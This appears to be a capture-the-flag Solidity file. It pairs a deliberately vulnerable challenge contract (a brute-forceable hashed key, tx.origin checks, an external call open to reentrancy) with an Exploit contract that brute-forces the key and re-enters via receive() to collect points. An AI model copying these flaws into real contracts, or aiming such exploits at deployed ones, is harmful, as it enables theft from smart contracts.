// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
contract ChallengeTwo {
    mapping(address => bool) public hasSolved1;
    mapping(address => bool) public hasSolved2;
    mapping(address => bool) public hasCompleted;
    mapping(address => uint) public userPoint;
    address[] public champions;
    mapping(address => string) public Names;

    function passKey(uint16 _key) external {
        require(
            keccak256(abi.encode(_key)) ==
                0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070,
            "invalid key"
        );
        hasSolved1[tx.origin] = true;
    }

    function getENoughPoint(string memory _name) external {
        require(hasSolved1[tx.origin], "go back and complete level 1");
        require(!hasSolved2[tx.origin], "already solved");
        userPoint[tx.origin]++;
        msg.sender.call("");
        if (userPoint[tx.origin] != 4) {
            revert("invalid point Accumulated");
        }
            Names[tx.origin] = _name;
            hasSolved2[tx.origin] = true;
    }

    function addYourName() external {
        require(!hasCompleted[tx.origin], "you have completed already");
        require(
            keccak256(abi.encode(Names[tx.origin])) !=
                keccak256(abi.encode("")),
            "invalid point Accumulated"
        );
        if(hasSolved2[tx.origin]){
         champions.push(tx.origin);
         hasCompleted[tx.origin] = true;
        }

    }

    function getAllwiners() external view returns (string[] memory _names) {
        _names = new string[](champions.length);
        for (uint i; i < champions.length; i++) {
            _names[i] = Names[champions[i]];
        }
    }
}

contract Exploit{
    function passkey(address c) public{
        for(uint16 i; i <= type(uint16).max; ++i){
            if(

            keccak256(abi.encode(i)) ==
                0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070
            ){
                ChallengeTwo(c).passKey(i);
                console2.log("key found", i);
                break;
            }
        }
}

function point(address c) external {
    ChallengeTwo(c).getENoughPoint("Pelz");
}

function add(address c) external {
    ChallengeTwo(c).addYourName();
}
 uint count;
receive() external payable {
        if(count != 3){
            count++;
            ChallengeTwo(msg.sender).getENoughPoint("Pelz");
        }

}
}